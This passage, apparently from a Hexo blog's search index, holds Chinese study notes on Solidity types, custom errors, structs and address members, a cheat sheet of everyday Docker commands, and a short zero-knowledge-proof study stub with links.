+<h2 id="错误（error-）"><a href="#错误（error-）" class="headerlink" title="错误（error ）"></a>错误（error ）</h2><p>error为失败情况定义描述性的名称和数据，可以在回滚（revert等）中使用。与字符串相比，error要便宜的多（消耗的gas少），并允许对额外的数据进行编码。可以使用 NatSpec 格式来向用户描述错误。</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 没有足够的资金用于转账。要求 `requested`。</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 但只有 `available` 可用。</span></span><br><span class="line"><span class="function">error <span class="title">NotEnoughFunds</span>(<span class="params"><span class="built_in">uint</span> requested, <span class="built_in">uint</span> available</span>)</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; <span class="built_in">uint</span>) balances;</span><br><span class="line">    <span class="function">function <span class="title">transfer</span>(<span class="params">address to, <span class="built_in">uint</span> amount</span>) <span class="keyword">public</span></span> &#123;</span><br><span class="line">        <span class="built_in">uint</span> balance = balances[msg.sender];</span><br><span class="line">        <span class="keyword">if</span> (balance &lt; amount)</span><br><span class="line">            <span class="function">revert <span class="title">NotEnoughFunds</span>(<span class="params">amount, balance</span>)</span>; <span class="comment">//回滚 error</span></span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="结构类型（struct）"><a href="#结构类型（struct）" class="headerlink" title="结构类型（struct）"></a>结构类型（struct）</h2><p>结构类型是可以将几个变量分组的自定义类型，和c语言一样的</p>
+<figure class="highlight d"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"><span class="keyword">pragma</span> solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Ballot &#123;</span><br><span class="line">    <span class="keyword">struct</span> Voter &#123; <span class="comment">// 结构</span></span><br><span class="line">        <span class="built_in">uint</span> weight;</span><br><span class="line">        <span class="built_in">bool</span> voted;</span><br><span class="line">        address <span class="built_in">delegate</span>;</span><br><span class="line">        <span class="built_in">uint</span> vote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="枚举类型（enum）"><a href="#枚举类型（enum）" class="headerlink" title="枚举类型（enum）"></a>枚举类型（enum）</h2><p>enum可用来创建由一定数量的’常量值’构成的自定义类型</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> SPDX-License-Identifier: GPL-<span class="number">3.0</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.4</span>.<span class="number">0</span> &lt;<span class="number">0.9</span>.<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    enum State &#123; Created, Locked, Inactive &#125; <span class="regexp">//</span> 枚举</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><h2 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h2><p>以下类型也称为值类型，因为这些类型的变量将始终按值来传递。 也就是说，当这些变量被用作函数参数或者用在赋值语句中时，总会进行值拷贝。</p>
+<h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p><code>bool</code> ：可能的取值为字面常数值 <code>true</code> 和 <code>false</code></p>
+<p>运算符：</p>
+<ul>
+<li><code>!</code> （逻辑非）</li>
+<li><code>&amp;&amp;</code> （逻辑与， “and” ）</li>
+<li><code>||</code> （逻辑或， “or” ）</li>
+<li><code>==</code> （等于）</li>
+<li><code>!=</code> （不等于）</li>
+</ul>
+<p>其中与和或都遵循短路原则</p>
+<h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><p><code>int</code> / <code>uint</code> ：分别表示有符号和无符号的不同位数的整型变量。 支持关键字 <code>uint8</code> 到 <code>uint256</code> （无符号，从 8 位到 256 位）以及 <code>int8</code> 到 <code>int256</code>，以 <code>8</code> 位为步长递增。 <code>uint</code> 和 <code>int</code> 分别是 <code>uint256</code> 和 <code>int256</code> 的别名。</p>
+<p>运算符：</p>
+<ul>
+<li>比较运算符： <code>&lt;=</code> ， <code>&lt;</code> ， <code>==</code> ， <code>!=</code> ， <code>&gt;=</code> ， <code>&gt;</code> （返回布尔值）</li>
+<li>位运算符： <code>&amp;</code> ， <code>|</code> ， <code>^</code> （异或）， <code>~</code> （位取反）</li>
+<li>算数运算符： <code>+</code> ， <code>-</code> ， 一元运算 <code>-</code> （仅针对有符号整数）， <code>*</code> ， <code>/</code> ， <code>%</code> （取余） ， <code>**</code> （幂）， <code>&lt;&lt;</code> （左移位） ， <code>&gt;&gt;</code> （右移位）</li>
+</ul>
+<p>对于一个整数类型X，你可以使用type(X).min和type(X).max来访问该类型可表示的最小和最大值。</p>
+<h3 id="位操作"><a href="#位操作" class="headerlink" title="位操作"></a>位操作</h3><p>位操作是在数字的补码进行的。这意味着，例如<code>~int256(0) == int256(-1)</code></p>
+<h3 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h3><p>移位操作的结果将截断成左操作数的类型；右操作数必须是无符号类型，否则会产生编译错误。</p>
+<ul>
+<li><code>x &lt;&lt; y</code> 等价于<code>x * 2**y</code>.</li>
+<li><p><code>x &gt;&gt; y</code>等价于<code>x / 2**y</code>，向负无穷取整</p>
+</li>
+<li><p>在<code>0.5.0</code>版本之前，负数x的右移<code>x&gt;&gt;y</code>相当于数学表达式<code>x/2**y</code>向零舍入，即右移使用向上取整（向零）而不是向下取整（向负无穷）。</p>
+</li>
+</ul>
+<p>ps：对移位操作从不进行溢出检查，就像对算术操作那样。相反，结果总是被截断的。</p>
+<h3 id="加减乘"><a href="#加减乘" class="headerlink" title="加减乘"></a>加减乘</h3><p>加法、减法和乘法具有通常的语义，在溢出和下溢方面有两种不同的模式：</p>
+<p>默认情况下，所有的算术都会被检查是否有下溢，但这可以通过unchecked块来禁用，从而导致包装算术。更多的细节可以在该部分找到。</p>
+<p>表达式-x相当于（T(0) - x），其中T是x的类型。如果x是负的，-x的值可以是正的。还有一个注意事项也是由补码引起的：</p>
+<p><code>如果你有int x = type(int).min;，那么-x就不符合正的范围。这意味着未经检查的&#123; assert(-x == x); &#125;是有效的，而表达式-x在检查模式下使用时将导致一个失败的断言。</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.1;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    int256 public a;</span><br><span class="line">    int256 public b;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        a = type(int256).min;</span><br><span class="line">        unchecked&#123;</span><br><span class="line">            b = -a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function compare() public view returns(bool) &#123;</span><br><span class="line">        bool jdg = (a==b);</span><br><span class="line">        return jdg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20230517153400833.png" alt="image-20230517153400833"></p>
+<h3 id="除"><a href="#除" class="headerlink" title="除"></a>除</h3><p>由于运算结果的类型总是操作数之一的类型，整数除法的结果总是一个整数。在Solidity中，除法是向零进位的。这意味着<code>int256(-5) / int256(2) == int256(-2)</code>。</p>
+<p>请注意，与此相反，在字面量（literals）上除法的结果是任意精度的小数值。</p>
+<p>除以0为导致报错，并且不能使用<code>unchecked&#123;&#125;</code>来禁用。</p>
+<p><code>type(int).min / (-1)</code>这个表达式是除法导致上溢的唯一情况</p>
+<h3 id="模"><a href="#模" class="headerlink" title="模"></a>模</h3><p>模操作<code>a % n</code>产生操作数<code>a</code>除以操作数<code>n</code>后的余数<code>r</code>，其中<code>q = int(a / n)，r = a - (n * q)</code>。这意味着模运算的结果与它的左边操作数（或零）相同，<code>a % n == -(-a % n)</code>对负数<code>a</code>成立：</p>
+<ul>
+<li><code>int256(5) % int256(2) == int256(1)</code></li>
+<li><code>int256(5) % int256(-2) == int256(1)</code></li>
+<li><code>int256(-5) % int256(2) == int256(-1)</code></li>
+<li><code>int256(-5) % int256(-2) == int256(-1)</code></li>
+</ul>
+<p>模0会导致报错，并且不能使用<code>unchecked&#123;&#125;</code>来禁用。</p>
+<h3 id="幂"><a href="#幂" class="headerlink" title="幂"></a>幂</h3><p>建议用<code>x*x*x</code>来代替<code>x**3</code>来减少gas消耗</p>
+<p>EVM定义<code>0**0=1</code></p>
+<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>地址有两种：</p>
+<ul>
+<li><code>address</code>: 保存一个20字节的值（以太坊地址的大小）。</li>
+<li><p><code>address payable</code>: 与<code>address</code>相同，但有额外的方法<code>transfer</code>和<code>send</code>。</p>
+<p><code>payable address</code>到<code>address</code>是可以隐式转换的，但<code>address</code>到<code>payable address</code>必须通过显式转换：<code>payable(&lt;address&gt;)</code></p>
+<p><code>uint160</code>，整数字面量、<code>bytes20</code>和合约类型都可以和<code>address</code>进行显式转换</p>
+<p>只有<code>address</code>和合约类型可以通过<code>payable</code>转换成<code>address payable</code>。对于一个合约类型，只有它可以接收以太币或存在一个<code>payable fallback function</code>才可以完成转换。注意 <code>payable(0)</code>是许可的。</p>
+</li>
+</ul>
+<p>注意：</p>
+<ol>
+<li>如果你需要一个<code>address</code>类型的变量，并计划向其发送以太币，那么请将其类型声明为<code>payable address</code></li>
+<li><code>address</code>和<code>address payable</code>的区别在<strong>0.5.0</strong>版本中引入的。同样从该版本开始，合约不能隐含地转换为<code>address</code>类型。但如果它们有一个接收或<code>payable fallback function</code>，仍然可以显式地转换为<code>address</code>或<code>address payable</code>。</li>
+</ol>
+<p>如果把一个较大的bytes转换成一个<code>address</code>，例如<code>bytes32</code>，那么<code>address</code>将被截断。例如，<code>b = &#39;0x111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFCCCC&#39;</code>:</p>
+<ul>
+<li><code>address(uint160(bytes20(b))) = 0x111122223333444455556666777788889999aAaa</code></li>
+<li><code>address(uint160(uint256(b))) = 0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc</code></li>
+</ul>
+<h3 id="地址成员"><a href="#地址成员" class="headerlink" title="地址成员"></a>地址成员</h3><ul>
+<li><p><code>balance</code> 和 <code>transfer</code></p>
+<p>查询某个地址的余额使用balance，向某个payable address发送以太币（wei为单位）使用transfer：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address payable x = payable(0x123);</span><br><span class="line">address myAddress = address(this);</span><br><span class="line">if (x.balance &lt; 10 &amp;&amp; myAddress.balance &gt;= 10) x.transfer(10);</span><br></pre></td></tr></table></figure>
+<p>如果x是一个合约地址，它的代码（实际上是接受以太坊的函数，或<code>Fallback</code>函数）会连同<code>transfer</code>一起执行。这是EVM的一个特性，无法被阻止。如果这段执行将gas消耗完或其他原因失败，<code>transfer</code>就会被回退</p>
+</li>
+<li><p><code>send</code></p>
+<p><code>send</code>是低级别的<code>transfer</code>，如果执行失败则会返回<code>false</code>而不是回退</p>
+<p>使用<code>send</code>有一些危险： 如果调用堆栈深度为1024，转账就会失败（这可以由调用者强制执行），如果接收者没有<code>gas</code>了，也会失败。因此，为了安全地进行以太币转账，一定要检查<code>send</code>的返回值、使用<code>transfer</code>，甚至更好的是：使用收款人取款的模式</p>
+</li>
+<li><p><code>call</code>, <code>delegatecall</code> 和 <code>staticcall</code></p>
+<p>为了与不遵守ABI的合约交互，或者为了更直接地控制编码，我们提供了函数<code>call</code>、<code>delegatecall</code>和<code>staticcall</code>。它们都接受一个字节的内存参数，并返回成功条件（作为一个<code>bool</code>）和返回的数据（字节内存）。函数<code>abi.encode</code>, <code>abi.encodePacked</code>, <code>abi.encodeWithSelector</code>和<code>abi.encodeWithSignature</code>可用于编码结构化数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory payload = abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;);</span><br><span class="line">(bool success, bytes memory returnData) = address(nameReg).call(payload);</span><br><span class="line">require(success);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>可以调节gas消耗量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address(nameReg).call&#123;gas: 1000000&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以太币也可以调节：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address(nameReg).call&#123;value: 1 ether&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>甚至是组合：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address(nameReg).call&#123;gas: 1000000, value: 1 ether&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>同样的，<code>delegatecall</code>也可以被这样使用，但不同的点在于：执行环境为当前合约的环境，目标合约地址只是被调用，<code>delegatecall</code>的目的是为了使用在另一个合约中的库代码</p>
+<p><code>staticcall</code>与<code>call</code>相似，但它会在调用的函数改变状态后<code>revert</code></p>
+<p>所有这三个函数<code>call</code>, <code>delegatecall</code> 和 <code>staticcall</code>都是非常低级的函数，只应该作为最后的手段使用，因为它们破坏了Solidity的类型安全。</p>
+<p><code>gas</code>选项在所有三种方法中都免费，而<code>value</code>选项只在<code>call</code>中免费。</p>
+</li>
+<li><p><code>code</code> 和<code>codehash</code></p>
+<p>可以查询任何智能合约的部署代码。使用<code>.code</code>来获取<code>EVM</code>字节码，作为字节内存，它可能是空的。使用<code>.codehash</code>获得该代码的<code>Keccak-256</code>哈希值（作为<code>bytes32</code>）。注意，<code>addr.codehash</code>比使用<code>keccak256(addr.code)</code>更便宜。</p>
+<p>所有的合同都可以转换为<code>address</code>类型，所以可以用<code>address(this).balance</code>查询当前合同的余额。</p>
+</li>
+</ul>
+<h3 id="合约类型"><a href="#合约类型" class="headerlink" title="合约类型"></a>合约类型</h3><p>每个合约都有自己的类型，它可以通过<code>adress(x)</code>显式地转化成<code>address</code>类型；如果合约中存在<code>receive</code>或<code>payable fallback</code>函数，则能转换成<code>payable address</code>类型；否则需要用<code>payable(address(x))</code>来转换。</p>
+<p>注意：在<code>0.5.0</code>版本以前，<code>address</code>和<code>payable address</code>没有区别。</p>
+<p>合约的数据表示与地址类型相同，这种类型也在<code>ABI</code>中使用。</p>
+<p>合约不支持任何操作符。</p>
+<p>合约的成员包括合约的<code>public</code>函数和任何标记<code>public</code>的状态变量。</p>
+<p>对于一个合约<code>c</code>，你可以使用<code>type(c)</code>来访问合同的类型信息。</p>
+<h3 id="定长字节数组"><a href="#定长字节数组" class="headerlink" title="定长字节数组"></a>定长字节数组</h3><p><code>bytes1, bytes2, bytes3, ..., bytes32</code>保存一串从1到32的字节。</p>
+<p>操作符：</p>
+<ul>
+<li>比较： <code>&lt;=</code>, <code>&lt;</code>, <code>==</code>, <code>!=</code>, <code>&gt;=</code>, <code>&gt;</code> (评估为bool)</li>
+<li>比特运算符：<code>&amp;</code>, <code>|</code>, <code>^</code> (bit异或), <code>~</code> (比特取反)</li>
+<li>移位运算符： <code>&lt;&lt;</code>（左移），<code>&gt;&gt;</code>（右移）</li>
+<li>索引访问： 如果<code>x</code>是<code>bytesI</code>类型的，那么<code>x[k]</code>对于<code>0 &lt;= k &lt; I</code>返回第<code>k</code>个字节（只读）。</li>
+</ul>
+<p>成员：</p>
+<ul>
+<li><code>.length</code> 返回定长数组的长度（只读）</li>
+</ul>
+<p>注意：<code>bytes1[]</code>类型是一个字节数组，但是由于填充规则，它为每个元素浪费了31个字节的空间（除了在存储中）。最好使用<code>bytes</code>类型来代替。</p>
+<p>注意：在<code>0.8.0</code>版本之前，<code>byte</code>曾经是<code>bytes1</code>的别名。</p>
+<h3 id="变长字节数组"><a href="#变长字节数组" class="headerlink" title="变长字节数组"></a>变长字节数组</h3><p><code>bytes</code>和<code>string</code></p>
+<h3 id="地址字面量"><a href="#地址字面量" class="headerlink" title="地址字面量"></a>地址字面量</h3><p>以<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-55.md">EIP-55</a>.为标准，不通过校验将无法成为地址</p>
+<h3 id="有理数和整数字面量"><a href="#有理数和整数字面量" class="headerlink" title="有理数和整数字面量"></a>有理数和整数字面量</h3><p>小数点字面量是由<code>.</code>与小数点后的至少一个数字组成。例子包括<code>.1</code>和<code>1.3</code>（但不能是<code>1.</code>）。也支持科学计数法，字面量MeE等价于<code>M*10**E</code>，指数部分必须是整数，尾数可以是小数。</p>
+<p>下划线可用来提高代码可读性，没有其他任何意义。例如，十进制123_000，十六进制0x2eff_abde，科学十进制符号1_2e345_678都是有效的。下划线只允许在两个数字之间，并且只允许一个连续的下划线。</p>
+<p>数字字面表达式保留了任意精度，直到被转换成其他非字面类型（即通过与数字字面表达式以外的其他东西一起使用（如布尔字面）或显式转换）。在数字字面表达式中，计算不会溢出，除法不会截断。例如，<code>2**800+1-2**800</code>在字面量中是允许的。<code>.5*8</code>的结果是整型的<code>4</code>。</p>
+<p>只要操作数是整数，任何可以应用于整数的操作符也可以应用于数字字面表达式。如果两者中的任何一个是小数，则不允许进行位操作，如果指数是小数，则不允许进行指数化（因为这可能导致非有理数）。</p>
+<p>以字面数为左（或基数）操作数，以整数类型为右（指数）操作数的移位和指数化，总是在<code>uint256</code>（对于非负的字面数字）或<code>int256</code>（对于负的字面数字）类型中进行，与右（指数）操作数的类型无关。</p>
+<p>在<code>0.4.0</code>之前，整数的字面量会被截断即<code>5/2=2</code>，之后是<code>2.5</code></p>
+<h3 id="字符字面量和类型"><a href="#字符字面量和类型" class="headerlink" title="字符字面量和类型"></a>字符字面量和类型</h3><p>字符字面量可以分开写，例如<code>“foo&quot;&quot;bar&quot;</code>等价于<code>”foobar&quot;</code>；并且<code>&quot;foo&quot;</code>只占用3个字节而不是4个字节（对比C语言的字符串以<code>&quot;\0&quot;</code>结尾）；它们可以隐式地转换成<code>bytes1</code>, …, <code>bytes32</code>；也可以转换成<code>bytes</code>和<code>string</code>。</p>
+<p>字符字面量只能包含ASCII可打印字符，也就是0x20到0x7E；此外，也包括以下转义符：</p>
+<ul>
+<li><code>\&lt;newline&gt;</code> (转义实际换行)</li>
+<li><code>\\</code> (反斜杠)</li>
+<li><code>\&#39;</code> (单引号)</li>
+<li><code>\&quot;</code> (双引号)</li>
+<li><code>\n</code> (换行符)</li>
+<li><code>\r</code> (回车)</li>
+<li><code>\t</code> (标签 tab)</li>
+<li><code>\xNN</code> (十六进制转义，表示一个十六进制的值，)</li>
+<li><code>\uNNNN</code> (unicode 转义，转换成UTF-8的序列)</li>
+</ul>
+<p>注意：直到0.8.0才推出：<code>\b</code>（退格）、<code>\f</code>（换页）、<code>\v</code>（垂直标签）；但如果实在需要用到，可以通过十六进制转义插入，即分别为<code>\x08</code>、<code>\x0c</code>和<code>\x0b</code>。</p>
+<p>任何unicode行终结符（除了LF，VF，FF，CR，NEL，LS，PS）都可以当成字符串字面常量的终止符。 只有当字符串字面常量前没有<code>\</code>时，换行符才能终止字符串字面常量。</p>
+<h3 id="Unicode字面量"><a href="#Unicode字面量" class="headerlink" title="Unicode字面量"></a>Unicode字面量</h3><p>Unicode字面量—以<code>unicode</code>开头—可以包含所有有效的UTF-8字符，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string memory a = unicode&quot;Hello 😃&quot;;</span><br></pre></td></tr></table></figure>
+<h3 id="十六进制字面量"><a href="#十六进制字面量" class="headerlink" title="十六进制字面量"></a>十六进制字面量</h3><p>以”hex”开头，紧跟单引号或双引号字符串： <code>hex&quot;001122FF&quot;</code>, <code>hex&#39;0011_22_FF&#39;</code>，可以使用下划线作为字符的分隔符。</p>
+<p>用空格分隔的十六进制字面量将表达成一个拼接起来的十六进制字面量：<code>hex&quot;00112233&quot; hex&quot;44556677&quot;</code> 等价于 <code>hex&quot;0011223344556677&quot;</code></p>
+<p>十六进制字面量不能隐式转换成字符字面量</p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3>]]></content>
+      <categories>
+        <category>blockchain</category>
+      </categories>
+      <tags>
+        <tag>blockchain</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>docker常用命令</title>
+    <url>/2023/04/18/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<p>不想老是搜了</p>
+<span id="more"></span>
+<h1 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h1><ul>
+<li><p>拉取镜像</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker pull image_name</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索镜像</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker search image_name</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>镜像列表</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除镜像</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker rmi image_name</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h1><ul>
+<li><p>启动镜像建立容器</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> image_name</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>建立并打开 STDIN，和shell交互</p>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> image_name</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>挂载文件夹 </p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">docker run -v $<span class="string">&quot;pwd&quot;</span>:/share image_name </span><br><span class="line"><span class="meta">#docker run -it -v <span class="meta-string">&quot;$PWD&quot;</span>:/home/share christoftorres/osiris</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>指定容器名</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> <span class="attribute">--name</span>=container_name image_name</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>查看容器列表 </p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li>启动容器 </li>
+</ul>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">docker <span class="literal">start</span> container_name</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>启动并交互</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">docker <span class="literal">start</span> -i container_name</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>关闭容器 </p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">docker stop container_name</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>重启容器 </p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker restart container_name</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>删除容器</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker rm container_name</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>删除指定镜像的所有容器</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">docker rm <span class="constructor">$(<span class="params">docker</span> <span class="params">ps</span> -<span class="params">a</span> | <span class="params">grep</span> <span class="string">&quot;image_name&quot;</span> | <span class="params">awk</span> &#x27;&#123;<span class="params">print</span> $1&#125;&#x27;)</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>文件拷贝</p>
+<ul>
+<li><p>当前目录-&gt;容器 </p>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="meta">cp</span> file_name container_name:/file_path</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>容器-&gt;当前目录 </p>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="meta">cp</span>  container_name:file_name</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Zero Knowledge Proofs</title>
+    <url>/2023/01/30/Zero-Knowledge-Proofs/</url>
+    <content><![CDATA[<p>This is the record of my study of ZKP</p>
+<span id="more"></span>
+<p><a href="https://zk-learning.org/">https://zk-learning.org/</a></p>
+<p><a href="https://www.youtube.com/watch?v=uchjTIlPzFo">https://www.youtube.com/watch?v=uchjTIlPzFo</a></p>
+<h1 id="Introduction-and-History-of-ZKP"><a href="#Introduction-and-History-of-ZKP" class="headerlink" title="Introduction and History of ZKP"></a>Introduction and History of ZKP</h1>]]></content>
+      <categories>
+        <category>ZKP</category>
+      </categories>
+      <tags>
+        <tag>ZKP</tag>
       </tags>
   </entry>
 </search>
